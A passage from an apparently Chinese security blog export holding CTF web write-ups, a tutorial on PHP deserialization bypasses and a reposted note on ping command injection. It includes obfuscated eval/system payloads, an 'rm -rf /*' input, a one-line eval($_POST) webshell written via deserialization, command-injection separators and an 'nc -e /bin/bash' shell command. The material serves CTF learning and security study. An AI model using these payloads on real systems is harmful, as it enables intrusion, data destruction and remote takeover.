<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 包含数据库连接文件,key flag 也在里面定义</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">                $f = $_GET[<span class="string">'flag'</span>];</span><br><span class="line">                <span class="keyword">if</span>($key===$f)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> $flag;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>看了WP听说是个梗题，构造url</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ecaff87a-<span class="number">1927</span>-<span class="number">4</span>a7d-a6fd-b1141f41b4eb.chall.ctf.show<span class="regexp">/?flag=rm -rf /</span>*</span><br></pre></td></tr></table></figure>
<p>得到flag{95d1ec7d-fd01-4dcf-ba44-e5af04047b4f} 。</p>
<h2 id="萌新计划web9"><a class="markdownIt-Anchor" href="#萌新计划web9"></a> 【萌新计划】web9</h2>
<p><strong>题目：</strong>  阿呆在埃塞俄比亚终于找了一个网管的工作，闲暇时还能种点菜。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|highlight/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码的意思是需要传递到参数c中包含<code>system|exec|highlight</code>,构造url</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://1ec537c0<span class="string">-6558</span><span class="string">-4</span>ca2<span class="string">-93</span>ee<span class="string">-84</span>f1df366922.chall.ctf.show/?c=highlight_file("config.php");</span><br></pre></td></tr></table></figure>
<p>得到flag{50686976-d892-4311-851f-41de75510df5}。<strong>注意：一定要加分号</strong>。</p>
<h2 id="萌新计划web10"><a class="markdownIt-Anchor" href="#萌新计划web10"></a> 【萌新计划】web10</h2>
<p><strong>题目：</strong>  阿呆看见对面二黑急冲冲的跑过来，告诉阿呆出大事了，阿呆问什么事，二黑说：这几天天旱，你菜死了！<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用PHP语法多次定义，拼凑payload<code>c=$x='sys';$y='tem';$z=$x.$y;$z('cat config.php');</code><br />
跳转到新页面后，查看源码，得到flag{78d9c590-10ad-4f0f-a9a5-58d13841192b}。</p>
<h2 id="萌新计划web11"><a class="markdownIt-Anchor" href="#萌新计划web11"></a> 【萌新计划】web11</h2>
<p><strong>题目：</strong>  阿呆听完自己菜死了，自己呆了。决定修好漏洞，绝对不能让自己再菜死了。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了cat，使用more替换即可<br />
<code>c=$a='sys';$b='tem';$z=$a.$b;$z('more config.php');</code><br />
得到flag{c856bc45-bb4e-4f57-8f55-93317f7cddf0}。</p>
<h2 id="萌新计划web12"><a class="markdownIt-Anchor" href="#萌新计划web12"></a> 【萌新计划】web12</h2>
<p><strong>题目：</strong>  阿呆不慌不忙的拔掉自己所有的菜，以后自己就不会菜死了。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat|\.|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
<p>又过滤了文件名，利用base64编解码，拼凑payload <code>c=$a=base64_decode(&quot;c3lzdGVt&quot;);$b=base64_decode(&quot;Y2F0IGNvbmZpZy5waHA=&quot;);$a($b);</code><br />
跳转到新页面后，查看源码，得到flag{33d9febb-c2dd-4b32-ad1b-f554c45e9052}。</p>
<h2 id="萌新计划web13"><a class="markdownIt-Anchor" href="#萌新计划web13"></a> 【萌新计划】web13</h2>
<p><strong>题目：</strong>  阿呆彻底呆了，阿呆拿起谷姐搜索好久，终于找到更狠的方法。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat|\.|\;|file|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
<p>在之前题目的基础上过滤了分号，只能执行一条语句，想到PHP中的命令执行函数还可以用<code>passthru()</code>，可以使用<code>?&gt;</code>闭合语句。<br />
拼凑payload<code>c=passthru('ca&quot;&quot;t</code>ls<code>')?&gt;</code>。<strong>注意：ls两边的是反引号。</strong><br />
在linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。<br />
cat <code>ls</code> 相当于将 ls出来的结果cat。<br />
跳转到新页面后，查看源码，得到flag{5da91d85-c854-4d5f-a725-d19caa9963c2}。</p>
<h2 id="萌新计划web14"><a class="markdownIt-Anchor" href="#萌新计划web14"></a> 【萌新计划】web14</h2>
<p><strong>题目：</strong>  阿呆忍无可忍了，告诉自己，如果还被攻，自己就跳下去。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat|\(|\.|\;|file|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
<p>在之前题目的基础上过滤了括号，拼凑payload<code>c=echo \</code>$_POST[a]`?&gt;<code>，以post方式传入</code>a=cat config.php`，<br />
得到flag{a90662b0-d0d4-43b1-ae28-9248dc8e4676}。</p>
<h2 id="萌新计划web15"><a class="markdownIt-Anchor" href="#萌新计划web15"></a> 【萌新计划】web15</h2>
<p><strong>题目：</strong>  人为什么要活着？难道埃塞俄比亚再无我阿呆容身之处？<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
<p>在之前题目的基础上过滤了问号，但未过滤分号，拼凑payload<code>c=echo \</code>$_POST[a]`;<code>，以post方式传入</code>a=cat config.php`，<br />
得到flag{3178e80f-3ea6-433f-ba6f-0a9307c93da1}。</p>
<h2 id="萌新计划web16"><a class="markdownIt-Anchor" href="#萌新计划web16"></a> 【萌新计划】web16</h2>
<p><strong>题目：</strong>  阿呆为了自己的梦想(fulage)，决定来一波反向跑路。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">"ctfshow$c"</span>)===<span class="string">"a6f57ae38a22448c2f07f3f95f49c84e"</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"nonono!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上脚本爆破，得到c=36d。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str1:</span><br><span class="line">            s = hashlib.md5((<span class="string">'ctfshow'</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#print(type(s))</span></span><br><span class="line">            <span class="keyword">if</span> s==<span class="string">'a6f57ae38a22448c2f07f3f95f49c84e'</span>:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>
<p>拼凑payload，得到flag{790f7029-1a66-4b2c-99c2-e912bfa8ed3d} 。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化漏洞</title>
    <url>/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><h1><a name="t0"></a><a id="PHP_0"></a>PHP反序列化漏洞</h1></p>
<h4><a id="PHPFIRSThttpsblogcsdnnetweixin_43726831articledetails102923033_1"></a><a href="https://blog.csdn.net/weixin_43726831/article/details/102923033" target="_blank" rel="noopener">PHP反序列化漏洞原理概述-FIRST</a></h4>
<h4><a id="1_2"></a>1.绕过魔法函数</h4>
<p><strong>wakeup()魔法函数</strong></p>
<ul>
<li>在<strong>unserialize()反序列化函数执行</strong>时会检测是否存在wakeup()方法，如果存在<strong>会先调用wakeup()方法</strong>作为预先准备对象需要的资源，经常用于执行一些初始化操作，或者重现建立数据库连接等场景</li>
</ul>
<p>PHP反序列化漏洞<strong>CVE-2016-7124</strong></p>
<ul>
<li>当反序列化字符串中，表示<strong>属性个数的值大于真实属性个数时</strong>，会绕过 __wakeup 函数的执行</li>
</ul>
<p><strong>影响范围</strong></p>
<ul>
<li>PHP5&lt;5.6.25</li>
<li>PHP7&lt;7.0.10</li>
<li>我们当前的PHP环境版本为5.4.45&lt;5.6.25,存在该反序列化漏洞</li>
</ul>
<p><strong>1.wakeup()绕过原理demo</strong></p>
<pre class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">//7.php</span>
<span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">class</span> <span class="token class-name">wakeup_bug</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'wakeup'</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">echo</span> <span class="token single-quoted-string string">'I an not '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">echo</span> <span class="token single-quoted-string string">'I am '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></pre>
<p><strong>构造payload：</strong><br>
我们自己按照这个类的格式，构造出一个序列化后的对象，如下</p>
<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:10:<span class="token string">"wakeup_bug"</span>:1:<span class="token punctuation">{</span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>s:6:<span class="token string">"wakeup"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style="">
<p>同时我们可以发现 <strong>__wakeup()在__destruct()函数之前执行</strong>，说明，只要存在了反序列化操作，__wakeup()函数的优先级高。<br>
<img src="https://img-blog.csdnimg.cn/20191107202343431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
当属性个数值大于真实属性个数值时，可绕过wakeup()函数，我们将自定义的序列化值修改一下，如下</p>
<p>将属性个数改为2&gt;真实属性个数1</p>
<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:10:<span class="token string">"wakeup_bug"</span>:2:<span class="token punctuation">{</span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>s:6:<span class="token string">"wakeup"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style="">
<p>绕过wakeup()函数成功，只执行了destruct()函数。<br>
<img src="https://img-blog.csdnimg.cn/20191107203022115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
<strong>2.wakeup()绕过原理demo1</strong></p>
<ul>
<li>在该demo中，<strong>__destruct()</strong> 中定义了文件操作，打开一个shell.php文件，写入变量$a的值，然后保存关闭该文件。</li>
<li>而 <strong>__wakeup()</strong> 函数中定义了<br>
foreach()函数：遍历数组函数<br>
get_object_vars()：返回由对象属性组成的关联数组<br>
<strong>在此处将$this指向的对象的值清空</strong></li>
<li>该demo1中有<strong>写入文件操作</strong>，这是一个<strong>危险操作</strong>，当我们能绕过__wakeup()函数，就可以写入<strong>一句话木马</strong>，获取webshell</li>
</ul>
<pre class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">//8.php</span>
<span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">class</span> <span class="token class-name">a</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">var</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"shell.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w+"</span><span class="token punctuation">)</span>
			<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//清空$a的值</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$b</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span>
</pre>
<p>由于__wakeup()函数执行先于__destruct()函数，也就是说，在 <strong>__destruct()函数执行文件操作</strong> 时，而_<strong>_wakeup()函数已经清空了$a的值</strong>，__destruct()函数写入shell.php文件的<strong>为空值</strong>。</p>
<p>此时就需要绕过__wakeup()函数<br>
<strong>构造payload</strong></p>
<p>我们自己按照这个类的格式，构造出一个序列化后的对象，对象的属性值赋予一句话木马，写入文件，如下</p>
<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:1:<span class="token string">"a"</span>:1:<span class="token punctuation">{</span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>s:27:<span class="token string">"&lt;?php @eval(<span class="token variable">$_POST</span>[123]);?&gt;"</span><span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code></pre>
<p><img src="https://img-blog.csdnimg.cn/20191107211054749.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><strong>木马植入成功</strong>，中国菜刀连接成功</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20191107211657762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4><a id="2privateprotected_94"></a>2.private(私有)、protected(保护)属性外部修改</h4>
<p><strong>public属性可以被外部修改</strong>而<strong>private</strong>、<strong>proctected</strong>属性无法被对象外部修改</p>
<p><strong>原理dome</strong></p>
<p><strong>__toString()函数：</strong> 把类当做字符串使用时触发，也就是使用echo打印对象时触发该函数。</p>
<pre class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">//9.php</span>
<span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">class</span> <span class="token class-name">stundet</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'BYF'</span><span class="token punctuation">;</span>
		<span class="token keyword">private</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token single-quoted-string string">'20'</span><span class="token punctuation">;</span>
		<span class="token keyword">protected</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token single-quoted-string string">'boy'</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token single-quoted-string string">'name: '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;age: '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;sex: '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">sex</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$s1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">stundet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$s1</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code></pre>
<p>下图为demo执行结果<br>
<img src="https://img-blog.csdnimg.cn/20191107224524316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
我们发现，序列化后，private变量，和protected变量的结果与public不一样</p>
<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:7:<span class="token string">"stundet"</span>:3:<span class="token punctuation">{</span>s:4:<span class="token string">"name"</span><span class="token punctuation">;</span>s:3:<span class="token string">"BYF"</span><span class="token punctuation">;</span>s:12:<span class="token string">"stundetage"</span><span class="token punctuation">;</span>s:2:<span class="token string">"20"</span><span class="token punctuation">;</span>s:6:<span class="token string">"*sex"</span><span class="token punctuation">;</span>s:3:<span class="token string">"boy"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code></pre>
<p><strong>private</strong>：在序列化后属性名为，<strong>类+变量名</strong>，且类使用&lt;0x00&gt;<strong>空字符相隔</strong>，在页面回显中无法看出<br>
<strong>proctected</strong>：在序列化后属性名为，*<strong>+变量名</strong>，且<code>*</code>使用&lt;0x00&gt;<strong>空字符相隔</strong>，在页面回显中无法看出<br>
<img src="https://img-blog.csdnimg.cn/20191107215848498.png" alt="在这里插入图片描述"><br>
由于序列化值中存在&lt;0x00&gt;空字符，占用一个字符，在url中%00为空字符</p>
<p><strong>构造payload</strong></p>
<p>从外部修改private&amp;proctected属性值</p>
<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:7:<span class="token string">"stundet"</span>:3:<span class="token punctuation">{</span>s:4:<span class="token string">"name"</span><span class="token punctuation">;</span>s:3:<span class="token string">"SHY"</span><span class="token punctuation">;</span>s:12:<span class="token string">"%00stundet%00age"</span><span class="token punctuation">;</span>s:2:<span class="token string">"19"</span><span class="token punctuation">;</span>s:6:<span class="token string">"%00*%00sex"</span><span class="token punctuation">;</span>s:4:<span class="token string">"girl"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code></pre>
<p><img src="https://img-blog.csdnimg.cn/20191107225116628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF关于ping命令注入问题</title>
    <url>/CTF/CTF%E5%85%B3%E4%BA%8Eping%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <!-- flowchart 箭头图标 勿删 -->
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                                            <h1><a name="t0"></a><a name="t0"></a><a id="_0"></a>题目样式</h1>
<p>对于看到ping或者ping命令却没有弄waf时就要想到命令注入。</p>
<h1><a name="t1"></a><a name="t1"></a><a id="_2"></a>具体注入方法</h1>
<p>看到ping命令就可以利用截断来执行新的命令。<br>
首先测试所有的截断符号：<br>
‘$’<br>
‘;’<br>
‘|’<br>
‘-’<br>
‘(’<br>
‘)’<br>
‘反引号’<br>
‘||’<br>
‘&amp;&amp;’<br>
‘&amp;’<br>
‘}’<br>
‘{’<br>
'%0a’可以当作空格来用；<br>
利用截断符号配合普通命令简单问题基本就出来；<br>
例如：<code>ip=127.0.0.1;cat /home/flag.txt</code><br>
简单的flag就出来了，也可以配合其他的进行；</p>
<h2><a name="t2"></a><a name="t2"></a><a id="_21"></a>命令注入原因</h2>
<p>系统提供命令执行类函数主要方便处理相关应用场景的功能.而当不合理的使用这类函数，同时调用的变量未考虑安全因素，就会执行恶意的命令调用，被攻击利用。</p>
<h2><a name="t3"></a><a name="t3"></a><a id="_23"></a>方法</h2>
<p>此类命令执行函数依赖PHP配置文件的设置，如果配置选项 safe_mode 设置为 off，此类命令不可执行，必须设置为 On<br>
的情况下，才可执行。PHP 默认是关闭的。在安全模式下，只有在特定目录中的外部程序才可以被执行，对其它程序的调用将被拒绝。这个目录可以在php.ini文件中用 safe_mode_exec_dir指令，或在编译PHP是加上 –with-exec-dir选项来指定，默认是/usr/local/php /bin。<br>
1：检测一阶命令注入的最佳方式是尝试执行一个sleep命令<br>
2：在外部可以访问的端口上生成一个shell（仅适用于自定义netcat构建）：nc -l -n -vv -p 80 -e /bin/bash (unix) 或 nc -l -n -vv -p 80 -e cmd.exe (windows)。<br>
3：如果想要知道目标主机名的长度，我们可以将主机名的输出通过管道符传递给wc -c命令。<br>
另外还有很多方法来进行命令注入。等我详细阅读之后继续整理</p>
<p>​</p>
<blockquote>
<p>转载于：<a href="https://blog.csdn.net/qq_41079177/article/details/88321816" target="_blank" rel="noopener">https://blog.csdn.net/qq_41079177/article/details/88321816</a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ping</tag>
      </tags>
  </entry>
  <entry>
    <title>公钥密码所需的数学基础</title>
    <url>/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E6%89%80%E9%9C%80%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<ol>
<li>
<p>完全剩余系<br />
(1) 定理1：对于给定的正整数m，有且恰有m个不同的模m的剩余类。<br />
